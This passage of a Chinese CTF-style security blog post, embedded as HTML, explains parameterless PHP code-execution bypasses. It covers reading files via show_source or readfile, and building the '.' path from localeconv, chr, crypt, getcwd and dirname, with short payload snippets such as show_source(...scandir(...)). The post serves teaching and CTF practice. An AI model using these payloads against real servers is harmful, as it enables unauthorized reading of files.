+<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.next.php">next()</a>- 将数组中的内部指针向前移动一位</li>
+</ol>
+<p>常用的读文件函数：</p>
+<ol>
+<li>show_source</li>
+<li>readfile</li>
+<li>highlight_file</li>
+<li>file_get_contents</li>
+<li>readgzfile</li>
+</ol>
+<p>payload：show_source(数组操作选择文件(scandir(路径)));</p>
+<p>那么只需要构造出需要的路径就行了。</p>
+<h2 id="localeconv"><a href="#localeconv" class="headerlink" title="localeconv"></a>localeconv</h2><p><code>localeconv</code>函数返回一包含本地数字及货币格式信息的数组，再通过<code>current</code>和<code>pos</code>，返回数组中的单元默认第一个：</p>
+<img src="/2022/08/06/%E4%B8%80%E4%BA%9B%E7%89%B9%E6%AE%8A%E7%9A%84webshell/image-20220816100328039.png" class="" loading="lazy">
+
+<p>或者<code>reset</code>函数将内部指针指向数组中的第一个元素，并输出。</p>
+<img src="/2022/08/06/%E4%B8%80%E4%BA%9B%E7%89%B9%E6%AE%8A%E7%9A%84webshell/image-20220816101740631.png" class="" loading="lazy">
+
+<h2 id="chr"><a href="#chr" class="headerlink" title="chr"></a>chr</h2><p><code>chr</code>函数可以从不同的ascii返回字符，且以256为周期循环，46对应的点，那么构造出46就行了，有多种思路：</p>
+<ol>
+<li><p>利用<a target="_blank" rel="noopener" href="https://www.w3school.com.cn/php/php_ref_math.asp">PHP中的数学函数</a>构造出46。种子可以用数学常量，或者特殊函数的返回值。例如：<code>chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))));</code></p>
+<img src="/2022/08/06/%E4%B8%80%E4%BA%9B%E7%89%B9%E6%AE%8A%E7%9A%84webshell/image-20220816104755870.png" class="" loading="lazy">
+</li>
+<li><p>利用<a target="_blank" rel="noopener" href="https://www.w3school.com.cn/php/php_ref_date.asp">PHP中的时间函数</a>构造出46。chr函数是以256为周期循环返回字符，所以只要在增加或者周期性变化的返回值都可以得到<code>.</code>，例如：<code>chr(pos(localtime()));</code></p>
+<img src="/2022/08/06/%E4%B8%80%E4%BA%9B%E7%89%B9%E6%AE%8A%E7%9A%84webshell/image-20220816110002100.png" class="" loading="lazy"></li>
+</ol>
+<h2 id="crypt"><a href="#crypt" class="headerlink" title="crypt"></a>crypt</h2><p>利用<code>crypt</code>函数返回 DES、Blowfish 或 MD5 算法加密的字符串，其中有概率出现<code>.</code>或者<code>/</code>在末尾。种子可以利用时间函数得到。再利用<code>ord</code>函数返回字符串中第一个字符的Ascii值，而<code>hebrevc</code>可以得到第一位为<code>.</code>的字符串。</p>
+<img src="/2022/08/06/%E4%B8%80%E4%BA%9B%E7%89%B9%E6%AE%8A%E7%9A%84webshell/image-20220816111342400.png" class="" loading="lazy">
+
+<p>也可以用<code>strrev</code>将字符串倒序，这样可以得到第一位为<code>.</code>或者<code>/</code>的字符串。</p>
+<img src="/2022/08/06/%E4%B8%80%E4%BA%9B%E7%89%B9%E6%AE%8A%E7%9A%84webshell/image-20220816111104220.png" class="" loading="lazy">
+
+<p><code>crypt(serialize(array())))</code>也可以得到以<code>.</code>或者<code>/</code>结尾的字符串，再利用<code>strrev</code>倒序：</p>
+<img src="/2022/08/06/%E4%B8%80%E4%BA%9B%E7%89%B9%E6%AE%8A%E7%9A%84webshell/image-20220816111833197.png" class="" loading="lazy">
+
+<h2 id="getcwd"><a href="#getcwd" class="headerlink" title="getcwd"></a>getcwd</h2><p><code>getcwd</code>可以得到当前目录的绝对路径</p>
+<img src="/2022/08/06/%E4%B8%80%E4%BA%9B%E7%89%B9%E6%AE%8A%E7%9A%84webshell/image-20220816113030394.png" class="" loading="lazy">
+
+<h2 id="realpath"><a href="#realpath" class="headerlink" title="realpath"></a>realpath</h2><p><code>realpath(&#39;.&#39;)</code>可以得到当前目录的绝对路径：</p>
+<img src="/2022/08/06/%E4%B8%80%E4%BA%9B%E7%89%B9%E6%AE%8A%E7%9A%84webshell/image-20220816140209612.png" class="" loading="lazy">
+
+<h2 id="dirname"><a href="#dirname" class="headerlink" title="dirname"></a>dirname</h2><p><code>dirname</code>可以返回路径中的目录部分。</p>
+<img src="/2022/08/06/%E4%B8%80%E4%BA%9B%E7%89%B9%E6%AE%8A%E7%9A%84webshell/image-20220816143824926.png" class="" loading="lazy">
+
+<p>由此可以读取其他路径的文件。要注意的是，在读其他目录的文件时要先用<code>chdir</code>切换目录，否则读取的还是原路径：</p>
+<img src="/2022/08/06/%E4%B8%80%E4%BA%9B%E7%89%B9%E6%AE%8A%E7%9A%84webshell/image-20220816201722199.png" class="" loading="lazy">
+
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/108569080">ctfshow web入门 web41</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/261800.html">php rce之无参数读文件</a></p>
+</div></section><div id="reward-container"><span class="hty-icon-button button-glow" id="reward-button" title="打赏" onclick="var qr = document.getElementById(&quot;qr&quot;); qr.style.display = (qr.style.display === &quot;none&quot;) ? &quot;block&quot; : &quot;none&quot;;"><span class="icon iconify" data-icon="ri:hand-coin-line"></span></span><div id="reward-comment">竟然有用？！赏！</div><div id="qr" style="display:none;"><div style="display:inline-block"><a href="/images/Alipay.png"><img loading="lazy" src="/images/Alipay.png" alt="支付宝" title="支付宝"></a><div><span style="color:#00A3EE"><span class="icon iconify" data-icon="ri:alipay-line"></span></span></div></div><div style="display:inline-block"><a href="/images/WechatPay.png"><img loading="lazy" src="/images/WechatPay.png" alt="微信支付" title="微信支付"></a><div><span style="color:#2DC100"><span class="icon iconify" data-icon="ri:wechat-pay-line"></span></span></div></div></div></div><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>Nayst</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="https://www.nayst.top/2022/08/06/%E4%B8%80%E4%BA%9B%E7%89%B9%E6%AE%8A%E7%9A%84webshell/" title="一些特殊的RCE绕过">https://www.nayst.top/2022/08/06/%E4%B8%80%E4%BA%9B%E7%89%B9%E6%AE%8A%E7%9A%84webshell/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><span class="icon iconify" data-icon="ri:creative-commons-line"></span><span class="icon iconify" data-icon="ri:creative-commons-by-line"></span><span class="icon iconify" data-icon="ri:creative-commons-nc-line"></span><span class="icon iconify" data-icon="ri:creative-commons-sa-line"></span></a> 许可协议。</li></ul></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/2022/08/14/ssrf/" rel="prev" title="ssrf"><span class="icon iconify" data-icon="ri:arrow-left-s-line"></span><span class="post-nav-text">ssrf</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/2022/08/05/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/" rel="next" title="正则表达式"><span class="post-nav-text">正则表达式</span><span class="icon iconify" data-icon="ri:arrow-right-s-line"></span></a></div></div></div><div class="hty-card" id="comment"></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2021 – 2022 </span><span class="with-love" id="animate"><span class="icon iconify" data-icon="ri:cloud-line"></span></span><span class="author"> Nayst</span></div><div class="powered"><span>由 <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 驱动 v6.2.0</span><span class="footer-separator">|</span><span>主题 - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.10.6</span></div><div class="live-time"><span>本博客已萌萌哒地运行</span><span id="display_live_time"></span><span class="moe-text">(●'◡'●)</span><script>function blog_live_time() {
+  setTimeout(blog_live_time, 1000);
+  const start = new Date('2021-07-01T18:00:00');
+  const now = new Date();
+  const timeDiff = (now.getTime() - start.getTime());
+  const msPerMinute = 60 * 1000;
+  const msPerHour = 60 * msPerMinute;
+  const msPerDay = 24 * msPerHour;
+  const passDay = Math.floor(timeDiff / msPerDay);
+  const passHour = Math.floor((timeDiff % msPerDay) / 60 / 60 / 1000);
+  const passMinute = Math.floor((timeDiff % msPerHour) / 60 / 1000);
+  const passSecond = Math.floor((timeDiff % msPerMinute) / 1000);
+  display_live_time.innerHTML = ` ${passDay} 天 ${passHour} 小时 ${passMinute} 分 ${passSecond} 秒`;
+}
+blog_live_time();
+</script></div></footer></div><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><span class="icon iconify" data-icon="ri:arrow-up-s-line"></span><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><a class="popup-trigger hty-icon-button icon-search" id="search" href="javascript:;" title="搜索"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:search-line"></span></span></a><script>window.addEventListener("DOMContentLoaded", () => {
+  // Handle and trigger popup window
+  document.querySelector(".popup-trigger").addEventListener("click", () => {
+    document.querySelector(".popup").classList.add("show");
+    setTimeout(() => {
+      document.querySelector(".search-input").focus();
+    }, 100);
+  });
+
+  // Monitor main search box
+  const onPopupClose = () => {
+    document.querySelector(".popup").classList.remove("show");
+  };
+
+  document.querySelector(".popup-btn-close").addEventListener("click", () => {
+    onPopupClose();
+  });
+
+  window.addEventListener("keyup", event => {
+    if (event.key === "Escape") {
+      onPopupClose();
+    }
+  });
+});
+</script><script src="https://fastly.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js"></script><script src="/js/search/local-search.js" defer type="module"></script><div class="popup search-popup"><div class="search-header"><span class="popup-btn-close close-icon hty-icon-button"><span class="icon iconify" data-icon="ri:close-line"></span></span></div><div class="search-input-container"><input class="search-input" id="local-search-input" type="text" placeholder="搜索..." value=""></div><div class="search-result-container"></div></div><script src="https://fastly.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js"></script><script>const images = [...document.querySelectorAll('.markdown-body img')]
+mediumZoom(images)</script><style>.medium-zoom-image {
+  z-index: 99;
+}</style></body></html>
